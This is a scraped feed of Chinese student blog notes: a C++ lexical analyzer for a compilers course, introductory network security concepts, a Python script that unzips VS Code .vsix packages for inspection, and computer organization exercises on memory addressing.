class="string">'_'</span>; }</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">isDigit</span><span class="params">(<span class="type">char</span> ch)</span> </span>{ <span class="keyword">return</span> <span class="built_in">isdigit</span>(ch); }</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查找保留字</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">searchReserve</span><span class="params">(<span class="type">const</span> string&amp; s)</span> </span>{</span><br><span class="line">    <span class="keyword">auto</span> it = reserveWords.<span class="built_in">find</span>(s);</span><br><span class="line">    <span class="keyword">if</span> (it != reserveWords.<span class="built_in">end</span>()) <span class="keyword">return</span> it-&gt;second;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>; <span class="comment">// 不是保留字</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出二元组</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">outputToken</span><span class="params">(<span class="type">const</span> string&amp; token, <span class="type">int</span> typeCode)</span> </span>{</span><br><span class="line">    cout &lt;&lt; <span class="string">"&lt;"</span> &lt;&lt; token &lt;&lt; <span class="string">","</span> &lt;&lt; typeCode &lt;&lt; <span class="string">"&gt;"</span> &lt;&lt; endl;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// 编译预处理</span></span><br><span class="line"><span class="function">string <span class="title">preprocess</span><span class="params">(<span class="type">const</span> string&amp; source)</span> </span>{</span><br><span class="line">    string result;</span><br><span class="line">    <span class="type">bool</span> inComment = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; source.<span class="built_in">size</span>(); ++i) {</span><br><span class="line">        <span class="type">char</span> ch = source[i];</span><br><span class="line">        <span class="keyword">if</span> (ch == <span class="string">'/'</span> &amp;&amp; i + <span class="number">1</span> &lt; source.<span class="built_in">size</span>() &amp;&amp; source[i + <span class="number">1</span>] == <span class="string">'/'</span>) { <span class="comment">// 单行注释</span></span><br><span class="line">            <span class="keyword">while</span> (++i &lt; source.<span class="built_in">size</span>() &amp;&amp; source[i] != <span class="string">'\n'</span>);</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (ch == <span class="string">'/'</span> &amp;&amp; i + <span class="number">1</span> &lt; source.<span class="built_in">size</span>() &amp;&amp; source[i + <span class="number">1</span>] == <span class="string">'*'</span>) { <span class="comment">// 开始多行注释</span></span><br><span class="line">            inComment = <span class="literal">true</span>;</span><br><span class="line">            ++i;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (inComment &amp;&amp; i + <span class="number">1</span> &lt; source.<span class="built_in">size</span>() &amp;&amp; source[i] == <span class="string">'*'</span> &amp;&amp; source[i + <span class="number">1</span>] == <span class="string">'/'</span>) { <span class="comment">// 结束多行注释</span></span><br><span class="line">            inComment = <span class="literal">false</span>;</span><br><span class="line">            ++i; <span class="comment">// 跳过 '/'</span></span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (!inComment &amp;&amp; (!<span class="built_in">isspace</span>(ch) || ch == <span class="string">' '</span>)) { <span class="comment">// 只添加非注释部分的非空白字符或空格</span></span><br><span class="line">            result += ch;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// 扫描源文件</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">scanner</span><span class="params">(<span class="type">const</span> string&amp; source)</span> </span>{</span><br><span class="line">    string token;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; source.<span class="built_in">size</span>(); ++i) {</span><br><span class="line">        <span class="type">char</span> ch = source[i];</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">isspace</span>(ch)) <span class="keyword">continue</span>; <span class="comment">// 忽略空白</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">isLetter</span>(ch) || ch == <span class="string">'_'</span>) {</span><br><span class="line">            token = ch;</span><br><span class="line">            <span class="keyword">while</span> (i + <span class="number">1</span> &lt; source.<span class="built_in">size</span>() &amp;&amp; (<span class="built_in">isLetter</span>(source[i + <span class="number">1</span>]) || <span class="built_in">isDigit</span>(source[i + <span class="number">1</span>]) || source[i + <span class="number">1</span>] == <span class="string">'_'</span>)) {</span><br><span class="line">                token += source[++i];</span><br><span class="line">            }</span><br><span class="line">            <span class="type">int</span> code = <span class="built_in">searchReserve</span>(token);</span><br><span class="line">            <span class="keyword">if</span> (code == <span class="number">-1</span>) { <span class="comment">// 标识符</span></span><br><span class="line">                identifiers.<span class="built_in">push_back</span>(token);</span><br><span class="line">                <span class="built_in">outputToken</span>(token, <span class="number">100</span>);</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">else</span> { <span class="comment">// 保留字</span></span><br><span class="line">                <span class="built_in">outputToken</span>(token, code);</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">isDigit</span>(ch)) {<span class="comment">//常数</span></span><br><span class="line">            token = ch;</span><br><span class="line">            <span class="keyword">while</span> (i + <span class="number">1</span> &lt; source.<span class="built_in">size</span>() &amp;&amp; <span class="built_in">isDigit</span>(source[i + <span class="number">1</span>])) {</span><br><span class="line">                token += source[++i];</span><br><span class="line">            }</span><br><span class="line">            <span class="built_in">outputToken</span>(token, <span class="number">99</span>); </span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span> {</span><br><span class="line">            <span class="comment">// 尝试识别多字符运算符</span></span><br><span class="line">            string <span class="built_in">op</span>(<span class="number">1</span>, ch);</span><br><span class="line">            <span class="keyword">if</span> (i + <span class="number">1</span> &lt; source.<span class="built_in">size</span>()) {</span><br><span class="line">                op += source[i + <span class="number">1</span>];</span><br><span class="line">                <span class="keyword">auto</span> it = operatorsAndDelimiters.<span class="built_in">find</span>(op);</span><br><span class="line">                <span class="keyword">if</span> (it != operatorsAndDelimiters.<span class="built_in">end</span>()) {</span><br><span class="line">                    <span class="built_in">outputToken</span>(op, it-&gt;second);</span><br><span class="line">                    ++i; <span class="comment">// 跳过下一个字符</span></span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                }</span><br><span class="line">            }</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 如果不是多字符运算符，则尝试单字符运算符或界符</span></span><br><span class="line">            <span class="keyword">if</span> (operatorsAndDelimiters.<span class="built_in">count</span>(<span class="built_in">string</span>(<span class="number">1</span>, ch))) {</span><br><span class="line">                <span class="built_in">outputToken</span>(<span class="built_in">string</span>(<span class="number">1</span>, ch), operatorsAndDelimiters.<span class="built_in">at</span>(<span class="built_in">string</span>(<span class="number">1</span>, ch)));</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">else</span> {</span><br><span class="line">                <span class="keyword">if</span> (ch == <span class="string">'$'</span>) <span class="keyword">break</span>; <span class="comment">// 结束符</span></span><br><span class="line">                cout &lt;&lt; <span class="string">"Unknown symbol: "</span> &lt;&lt; ch &lt;&lt; <span class="string">" at position "</span> &lt;&lt; i &lt;&lt; endl;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// 打印源代码并返回文件内容</span></span><br><span class="line"><span class="function">string <span class="title">prReContent</span><span class="params">(<span class="type">const</span> string&amp; filename)</span> </span>{</span><br><span class="line">    <span class="function">ifstream <span class="title">file</span><span class="params">(filename)</span></span>;</span><br><span class="line">    <span class="keyword">if</span> (!file.<span class="built_in">is_open</span>()) {</span><br><span class="line">        cerr &lt;&lt; <span class="string">"Failed to open file."</span> &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; <span class="string">"=== Source Code =====\n"</span>;</span><br><span class="line">    string line, source;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">getline</span>(file, line)) {</span><br><span class="line">        cout &lt;&lt; line &lt;&lt; endl;</span><br><span class="line">        source += line + <span class="string">'\n'</span>; <span class="comment">// 确保保留行之间的换行符</span></span><br><span class="line">    }</span><br><span class="line">    cout &lt;&lt; <span class="string">"=====================\n\n"</span>;</span><br><span class="line"></span><br><span class="line">    file.<span class="built_in">close</span>();</span><br><span class="line">    <span class="keyword">return</span> source;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>{</span><br><span class="line">    <span class="type">const</span> string filename = <span class="string">"source.txt"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打印文件源代码并获取其内容</span></span><br><span class="line">    string source = <span class="built_in">prReContent</span>(filename);</span><br><span class="line">    <span class="keyword">if</span> (source.<span class="built_in">empty</span>()) {</span><br><span class="line">        <span class="comment">// 如果文件打开失败，直接退出</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    string processedSource = <span class="built_in">preprocess</span>(source);</span><br><span class="line">    <span class="built_in">scanner</span>(processedSource);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>

<p>LUM图</p>
<pre class="mermaid">graph TB
    A[开始] --&gt; B[打印源代码]
    B --&gt;|调用printSource|C[打开文件]
    C --&gt;|失败|D[/输出错误信息并结束/]
    C --&gt;|成功|E[打印文件内容]
    E --&gt;I[读取文件内容]
    I --&gt; J[关闭文件]
    J --&gt; K[预处理源代码]
    K --&gt;|调用preprocess|L[遍历字符]
    L --&gt; M[返回预处理后的源代码]
    M --&gt; N[扫描源代码]
    N --&gt;|调用scanner|O[初始化变量]
    O --&gt; P[遍历字符]
    P --&gt;|忽略空白字符|Q[处理标识符/保留字]
    Q --&gt;|处理数字|R[处理运算符和界符]
    R --&gt;|遇到$符号|S[结束扫描]
    S --&gt; T[结束]
    P --&gt;|结束|S
    R --&gt;|遇到未知符号|U[/输出错误信息/]
    U --&gt; P</pre>



]]></content>
      <categories>
        <category>Learning</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>编译原理</tag>
      </tags>
  </entry>
  <entry>
    <title>网络安全技术与应用</title>
    <url>/2024/12/26/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E4%B8%8E%E5%BA%94%E7%94%A8/</url>
    <content><![CDATA[<meta name="referrer" content="no-referrer">

<h1 id="网络安全概述"><a href="#网络安全概述" class="headerlink" title="网络安全概述"></a>网络安全概述</h1><h2 id="网络安全的定义"><a href="#网络安全的定义" class="headerlink" title="网络安全的定义"></a>网络安全的定义</h2><p>网络安全保证网络中信息及数据的保密性，完整性，和可用性。</p>
<h2 id="网络安全的发展历史"><a href="#网络安全的发展历史" class="headerlink" title="网络安全的发展历史"></a>网络安全的发展历史</h2><ol>
<li>通信安全时期</li>
<li>信息安全时期<ul>
<li><strong>保密性</strong>：确保信息只能由授权的人员获取及使用，以及确保数据即使被攻击者窃取，也不能被正确读出。</li>
<li><strong>完整性</strong>：确保信息在传输过程中不被篡改，且接收方能够是被信息是否被篡改。</li>
<li><strong>可用性</strong>：确保被授权人员在需要时可以获取和使用相关的信息。</li>
</ul>
</li>
<li>信息保障时期<ul>
<li><strong>可控性</strong>：对信息和信息系统实施安全监控与管理，防止信息和信息系统被非法利用。</li>
<li><strong>不可否认性</strong>：防止信息源用户对其发送的信息不承认，或者用户接收到信息之后不认账。</li>
</ul>
</li>
<li>网络空间安全时期</li>
</ol>
<h2 id="网络安全的发展趋势"><a href="#网络安全的发展趋势" class="headerlink" title="网络安全的发展趋势"></a>网络安全的发展趋势</h2><h3 id="网络安全动态感知"><a href="#网络安全动态感知" class="headerlink" title="网络安全动态感知"></a>网络安全动态感知</h3><blockquote>
<p>当前，企业网络环境中部署的各类安全设备主要使用 <strong>单点检测</strong>，无法应对 **高级持续性威胁(Advanced Persistent Threat APT)**为代表的新型网络威胁</p>
</blockquote>
<p>网络安全动态感知是指基于环境动态、整体地洞悉安全风险的能力。</p>
<blockquote>
<p>主要功能：</p>
<p><strong>安全要素采集</strong>：采集各类安全设备中的海量要素，包括流量数据、各类日志、漏洞、木马和病毒样本。</p>
<p><strong>安全数据处理</strong>：对采集到的安全要素数据进行清洗、分类、标准化、关联补齐和添加标签等操作，将标准数据加载到存储的数据中。</p>
<p><strong>安全数据分析和结果展示</strong>：利用数据挖掘及智能分析等技术，提取系统安全特征和指标，发现网络安全风险。</p>
</blockquote>
<h3 id="零信任"><a href="#零信任" class="headerlink" title="零信任"></a>零信任</h3><blockquote>
<p>零信任的核心思想：默认情况下不信任任何网络内部和外部的任何用户、设备和系统，需要基于认证和授权重构访问控制的信任基础。</p>
</blockquote>
<blockquote>
<p>零信任建立的是以 <strong>身份认证为中心，以识别、持续认证、动态访问控制、授权、审计和检测为链条</strong>，以多维信任为基础、以最小化实时授权为核心，认证可覆盖网络末端的动态安全架构</p>
</blockquote>
<blockquote>
<p><strong>核心目标：</strong>消除边界问题带来的安全风险</p>
</blockquote>
<h2 id="网络安全的标准和规范"><a href="#网络安全的标准和规范" class="headerlink" title="网络安全的标准和规范"></a>网络安全的标准和规范</h2><h3 id="PDCA流程（Plan-Do-Check-Action"><a href="#PDCA流程（Plan-Do-Check-Action" class="headerlink" title="PDCA流程（Plan,Do,Check,Action)"></a>PDCA流程（Plan,Do,Check,Action)</h3><ol>
<li>计划：ISMS的策划与准备</li>
<li>实施：ISMS文件的编制</li>
<li>检查：运行ISMS。</li>
<li>改进：ISMS的审核、评审和持续改进</li>
</ol>
<h3 id="网络安全等级保护制度"><a href="#网络安全等级保护制度" class="headerlink" title="网络安全等级保护制度"></a>网络安全等级保护制度</h3><ol>
<li><p>安全保护等级</p>
<ul>
<li><p>第一级：用户自主保护级</p>
</li>
<li><p>第二级：指导保护级，二级及以上的等保对象，其网络运营单位需依据定级标准，组织进行专家评审，主管部门审核和备案审查，最终确定其安全保护等级。</p>
</li>
<li><p>第三级：监督保护级</p>
</li>
<li><p>第四级：强制保护级</p>
</li>
<li><p>第五级：专控保护级</p>
</li>
</ul>
</li>
<li><p>等级保护工作流程</p>
<ol>
<li>定级</li>
<li>备案</li>
<li>建设整改</li>
<li>等级测评</li>
<li>监督检查</li>
</ol>
</li>
</ol>
<h2 id="网络基础"><a href="#网络基础" class="headerlink" title="网络基础"></a>网络基础</h2><h3 id="网络体系结构"><a href="#网络体系结构" class="headerlink" title="网络体系结构"></a>网络体系结构</h3><h4 id><a href="#" class="headerlink" title></a></h4><h4 id="-1"><a href="#-1" class="headerlink" title></a></h4><h4 id="-2"><a href="#-2" class="headerlink" title></a></h4><h4 id="OSI体系结构"><a href="#OSI体系结构" class="headerlink" title="OSI体系结构"></a>OSI体系结构</h4><ol>
<li><strong>OSI体系结构</strong>（7层）<ul>
<li>应用层</li>
<li>表示层</li>
<li>会话层</li>
<li>传输层</li>
<li>网络层</li>
<li>数据链路层</li>
<li>物理层</li>
</ul>
</li>
<li>TCP&#x2F;IP</li>
</ol>
]]></content>
      <categories>
        <category>Learning</category>
      </categories>
      <tags>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>解压查看vsix插件脚本</title>
    <url>/2025/02/14/%E8%A7%A3%E5%8E%8B%E6%9F%A5%E7%9C%8Bvsix%E6%8F%92%E4%BB%B6%E8%84%9A%E6%9C%AC/</url>
    <content><![CDATA[<meta name="referrer" content="no-referrer">

<p><code>.vsix</code> 文件是 Visual Studio Code 扩展的安装包，实际上是一个 ZIP 压缩文件。你可以通过解压缩 <code>.vsix</code> 文件来查看其源代码和内容。以下是一个 Python 脚本，用于解压 <code>.vsix</code> 文件并提取其中的内容到指定目录。</p>
<hr>
<h3 id="Python-脚本：解压-vsix-文件"><a href="#Python-脚本：解压-vsix-文件" class="headerlink" title="Python 脚本：解压 .vsix 文件"></a><strong>Python 脚本：解压 <code>.vsix</code> 文件</strong></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_vsix</span>(<span class="params">vsix_path, extract_dir</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    解压 .vsix 文件到指定目录</span></span><br><span class="line"><span class="string">    :param vsix_path: .vsix 文件的路径</span></span><br><span class="line"><span class="string">    :param extract_dir: 解压目标目录</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 检查 .vsix 文件是否存在</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(vsix_path):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Error: 文件 <span class="subst">&#123;vsix_path&#125;</span> 不存在&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建解压目录</span></span><br><span class="line">    os.makedirs(extract_dir, exist_ok=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 解压 .vsix 文件</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> zipfile.ZipFile(vsix_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> zip_ref:</span><br><span class="line">            zip_ref.extractall(extract_dir)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;解压完成：<span class="subst">&#123;vsix_path&#125;</span> 已解压到 <span class="subst">&#123;extract_dir&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;解压失败：<span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 设置 .vsix 文件路径和解压目标目录</span></span><br><span class="line">    vsix_file = <span class="string">&quot;example.vsix&quot;</span>  <span class="comment"># 替换为你的 .vsix 文件路径</span></span><br><span class="line">    output_dir = <span class="string">&quot;extracted_vsix&quot;</span>  <span class="comment"># 解压目标目录</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 调用解压函数</span></span><br><span class="line">    extract_vsix(vsix_file, output_dir)</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="使用说明"><a href="#使用说明" class="headerlink" title="使用说明"></a><strong>使用说明</strong></h3><ol>
<li>将脚本保存为 <code>extract_vsix.py</code>。</li>
<li>修改 <code>vsix_file</code> 变量为你要解压的 <code>.vsix</code> 文件路径。</li>
<li>修改 <code>output_dir</code> 变量为你希望解压到的目标目录。</li>
<li>运行脚本：<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python extract_vsix.py</span><br></pre></td></tr></table></figure></li>
<li>解压完成后，可以在 <code>output_dir</code> 目录中查看 <code>.vsix</code> 文件的内容，包括源代码和资源文件。</li>
</ol>
<hr>
<h3 id="解压后的文件内容"><a href="#解压后的文件内容" class="headerlink" title="解压后的文件内容"></a><strong>解压后的文件内容</strong></h3><p>解压后的目录可能包含以下内容：</p>
<ul>
<li><code>extension/</code>：扩展的核心代码和资源文件。</li>
<li><code>package.json</code>：扩展的元数据信息（如名称、版本、依赖等）。</li>
<li><code>README.md</code>：扩展的说明文档。</li>
<li>其他资源文件（如图片、配置文件等）。</li>
</ul>
<hr>
<h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a><strong>注意事项</strong></h3><ul>
<li>确保 <code>.vsix</code> 文件是合法的扩展包。</li>
<li>如果 <code>.vsix</code> 文件包含加密或混淆的代码，解压后可能无法直接查看源代码。</li>
</ul>
]]></content>
      <categories>
        <category>TOOL</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title>计算机组成原理</title>
    <url>/2024/06/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/</url>
    <content><![CDATA[<meta name="referrer" content="no-referrer">

<h2 id="第一章：计算机系统概论"><a href="#第一章：计算机系统概论" class="headerlink" title="第一章：计算机系统概论"></a>第一章：计算机系统概论</h2><ol>
<li>计算机系统由<u>“硬件”</u>和<u>“软件”</u>两部分组成。</li>
<li>计算机软件又可以分为“系统软件”和“应用软件”组成。</li>
<li>计算机的五大组成部件：运算器、存储器、控制器、输入设备、输出设备。</li>
<li>早期计算机的指令和数据属于同等地位存储在存储器内，并可按地址寻址。当代计算机的指令和数据不属于同等地位。</li>
<li>指令分为“地址码”和“操作码”。</li>
<li>早期计算机以<u>运算器</u>为中心，当代计算机以<u>存储器</u>为中心。</li>
<li>机器字长是指CPU一次能处理数据的位数，通常与CPU的寄存器位数有关。</li>
<li>1Kx8位的存储器最少需要20根线，存储容量是 2^10^X2^3^b&#x3D;2^3^KB&#x3D;8KB,10根地址线，8根数据线，1根片选信号，1根读写控制。</li>
<li>1B&#x3D;8b;    2^10^&#x3D;1K&#x3D;1024;      2^20^&#x3D;2^10^x1K&#x3D;1M;     2^30^&#x3D;1G;       2^40^&#x3D;1T;</li>
</ol>
<h2 id="第三章：系统总线"><a href="#第三章：系统总线" class="headerlink" title="第三章：系统总线"></a>第三章：系统总线</h2><ol>
<li><p>总线的概念：总线是连续多个部件的信息传输线，是各个部件的传输介质。</p>
</li>
<li><p>总线的分类：</p>
<ul>
<li><p>按<u>数据传输方式</u>分：并行传输总线、串行传输总线。</p>
</li>
<li><p>按<u>传输信息的种类</u>分：</p>
<p>1、<strong>数据总线</strong>【双向传输数据的通道，与机器的字长、存储字有关】。</p>
<p>2、<strong>地址总线</strong>【单向传输地址，由CPU输出，与存储地址、I&#x2F;O地址有关，地址线的位数与存储单元的个数有关，地址线为20根，存储单元个数为2^20^】。</p>
<p>3、<strong>控制总线</strong>【具有输入和输出】。</p>
</li>
</ul>
</li>
<li><p>总线的特性：机械特性、电气特性、功能特性、时间特性。</p>
</li>
<li><p>总线控制：</p>
<ul>
<li>总线上的设备按其<u><strong>对总线是否具有控制功能</strong></u>分为<u>主设备</u>和<u>从设备</u>。</li>
<li>总线判优控制可分为<u><strong>分布式</strong></u>和<u><strong>集中式</strong></u>【<strong>1、链式查询；2、计数器定时查询；3、独立请求方式</strong>】。</li>
</ul>
</li>
<li><p>总线通信控制：</p>
<ul>
<li>同步通信：通信双方有<u>“统一时标”</u>控制数据传输称为同步通信。</li>
<li>异步通信：没有公共的时钟标准</li>
<li>半同步通信：同步通信和异步通信相结合</li>
<li>分离式通信</li>
</ul>
</li>
</ol>
<h2 id="第四章：存储器"><a href="#第四章：存储器" class="headerlink" title="第四章：存储器"></a>第四章：存储器</h2><ol>
<li><p>存储器按**<u>存取方式</u>**分类分为：</p>
<ul>
<li>随机存储器（Random Access Memory ,RAM）：<ul>
<li>静态RAM【触发器原理寄存信息】</li>
<li>动态RAM【电容充放电原理寄存信息】</li>
<li>举例：U盘、内存条</li>
</ul>
</li>
<li>只读存储器（Read Only Memory ,ROM）</li>
<li>串行访问存储器<ul>
<li>顺序存取存储器</li>
<li>直接存取存储器</li>
</ul>
</li>
</ul>
</li>
<li><p>字节寻址的主存地址分配：</p>
<ul>
<li><p>大端方式【高位字节地址作为字地址】</p>
<p>​																	         高位																										     低位</p>
<table>
<thead>
<tr>
<th>字地址</th>
<th>字</th>
<th>节</th>
<th>地</th>
<th>址</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>0</td>
<td>1</td>
<td>2</td>
<td>3</td>
</tr>
<tr>
<td>4</td>
<td>4</td>
<td>5</td>
<td>6</td>
<td>7</td>
</tr>
<tr>
<td>8</td>
<td>8</td>
<td>9</td>
<td>10</td>
<td>11</td>
</tr>
</tbody></table>
<p>4X8位&#x3D;32位CPU</p>
</li>
<li><p>小端方式【地位字节地址作为字地址】</p>
<p>​																											高位																		低位</p>
<table>
<thead>
<tr>
<th>字地址</th>
<th>字节</th>
<th>地址</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>1</td>
<td>0</td>
</tr>
<tr>
<td>2</td>
<td>3</td>
<td>2</td>
</tr>
<tr>
<td>4</td>
<td>5</td>
<td>4</td>
</tr>
</tbody></table>
<p>2X8位&#x3D;16位CPU</p>
</li>
</ul>
</li>
<li><p>例题【4.6】某机字长为32位，其存储容量是64KB，按字编址其寻址范围为( <u>64KB&#x2F;(32b&#x2F;8b)</u>&#x3D;<u>64KB&#x2F;4B</u>&#x3D;16K );按字节编址的寻址范围为(     64KB&#x2F;1B&#x3D;64K     ),并画出主存字地址和字节地址的分配情况。</p>
<ul>
<li><img src="https://gitee.com/kingwempity/images/raw/master/images/%E4%B8%BB%E5%AD%98%E7%9A%84%E7%BC%96%E5%9D%80.png" alt="主存的编址"></li>
</ul>
</li>
<li><p>例题【4.14】某8位微型计算机地址码位18位，若使用4KX4位的RAM芯片组成模块板结构的存储器，试问：</p>
<ol>
<li><p>该机所允许的组大主存空间是多少？</p>
<ul>
<li>2^18^X8位&#x3D;2^8^K X8b&#x3D;256KB</li>
</ul>
</li>
<li><p>若每个模块板为32KX8位，共需要多少个模块板？</p>
<ul>
<li>(2^8^KX8b)&#x2F;(32KX8b)&#x3D;2^3^&#x3D;8片</li>
</ul>
</li>
<li><p>每个模板块内共有多少片RAM芯片？</p>
<ul>
<li>(32KX8b)&#x2F;(4KX4b)&#x3D;8*2&#x3D;16片</li>
</ul>
</li>
<li><p>共有多少片RAM？</p>
<ul>
<li>​	16*8&#x3D;128片</li>
</ul>
</li>
<li><p>CPU如何选择各模板？</p>
<ul>
<li><img src="https://gitee.com/kingwempity/images/raw/master/images/4-14.png" alt="4—14"></li>
</ul>
</li>
<li><p>例题【4-15】设CPU共有16根地址线,8根数据线,并用$\overline{\text{MREQ}}$(低电平有效)作访存控制信号， $\overline{\text{R&#x2F;W}}$作读&#x2F;写命令信号(高电平为读,低电平为写)。现有这些存储芯片:ROM(2K×8位,4K×4位,8K×8位),RAM(1K×4位，2K×8位，4K×8位)及74138译码器和其他门电路(门电路自定)。</p>
<p>试从上述规格中选用合适的芯片,画出CPU和存储芯片的连接图。要求如下:<br>(1)最小4K地址为系统程序区.4096~16383地址范围为用户程序区。<br>(2)指出选用的存储芯片类型及数量。<br>(3)详细画出片选逻辑。<br>答：<br>(1)地址空间分配图:<br>系统程序区(ROM共4KB):0000H-0FFFH<br>用户程序区(RAM共12KB):1000H-3FFFH[(4096-16383)]<br>(2)选片:<br>ROM:选择4K×4位芯片2片,位并联<br>RAM:选择4K×8位芯片3片,字串联(RAM1地址范围为:1000H-1FFFH,RAM2地址范围为2000H-2FFFH, RAM3地址范围为:3000H-3FFFH)</p>
<p>(3)各芯片二进制地址分配如下</p>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/4-15-1.png" alt="4-15-1"></p>
<p>CPU和存储器连接逻辅图及片选逻辑如下图所示:</p>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/4-15-2.png" alt="4-15-2"></p>
<p>原文链接：<a href="https://blog.csdn.net/weixin_45735391/article/details/127178726">https://blog.csdn.net/weixin_45735391/article/details/127178726</a></p>
</li>
<li><p>CPU假设同上题，现有8片8K×8位的RAM芯片与CPU相连。</p>
<p>(1)用74138译码器画出CPU与存储芯片的连接图。<br>(2)写出每片RAM的地址范围。<br>(3)如果运行时发现不论往哪片RAM写入数据，以A000H为起始地址的存储芯片都有与其相同的数据分析故障原因。<br>(4)根据(1)的连接图,若出现地址线 A 13 A_{13} A13与CPU断线,并搭接到高电平上,将出现什么后果?<br>答:<br>(1)CPU与存储器芯片连接逻辑图:<br><img src="https://gitee.com/kingwempity/images/raw/master/images/4-16-1.png" alt="4-16-1"></p>
<p>(2)地址空间分配图:<br>RAM0:0000H-1FFFH<br>RAM1:2000H-3FFFH<br>RAM2:4000H-5FFFH<br>RAM3:6000H-7FFFH<br>RAM4:8000H-9FFFH<br>RAM5:A000H-BFFFH<br>RAM6:C000H-DFFFH<br>RAM7:E000H-FFFFH</p>
<p>(3)如果运行时发现不论往哪片RAM写入数据后，以A000H为起始地址的存储芯片(RAM5)都有与其相同的数据，则根本的故障原因为:该存储芯片的片选输入端很可能总是处于低电平。<br>假设芯片与译码器本身都是好的，可能的情况有:<br>①该片的 $\overline{\text{CS}}$端与 $\overline{\text{WE}}$端错连或短路:<br>②该片的 $\overline{\text{CS}}$端与CPU的 $\overline{\text{MREQ}}$端错连或短路；<br>③该片的 $\overline{\text{CS}}$端与地线错连或短路。</p>
<p>(4)如果地址线A13与CPU断线，并搭接到高电平上，将会出现A13恒为“1”的情况。此时存储器只能寻址A13&#x3D;1的地址空间(奇数片)，A13&#x3D;0的另一半地址空间(偶数片)将永远访问不到。若对A13&#x3D;0的地址空间(偶数片)进行访问，只能错误地访问到A13&#x3D;1的对应空间(奇数片)中去。</p>
<p>原文链接：<a href="https://blog.csdn.net/weixin_45735391/article/details/127178726">https://blog.csdn.net/weixin_45735391/article/details/127178726</a></p>
</li>
<li><p>提高访存数度的措施：</p>
<ul>
<li>采用高速器件</li>
<li>采用层次结构Cash-主存结构</li>
<li>调整主存结构</li>
</ul>
</li>
<li><p>多体并行系统</p>
<ul>
<li>​	高位交叉编址<ul>
<li>顺序编址</li>
<li>能够增加内存的容量，但不能提高速度</li>
</ul>
</li>
